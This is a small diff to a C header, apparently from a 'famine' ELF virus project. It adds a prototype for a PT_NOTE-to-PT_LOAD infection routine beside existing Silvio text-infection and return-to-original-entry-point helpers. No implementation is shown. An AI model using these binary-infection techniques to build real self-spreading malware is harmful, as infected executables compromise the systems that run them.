@@ -184,6 +184,7 @@ int get_binary_data(char *file_name, t_famine *famine);
 void overwrite_original_binary(t_famine *famine);
 
 void silvio_text_infection(t_famine *famine);
+void pt_note_to_pt_load_infection(t_famine *famine);
 
 size_t find_keysection_offset_elf64(t_famine *famine);
 size_t find_ret2oep_offset_elf64(t_famine *famine);
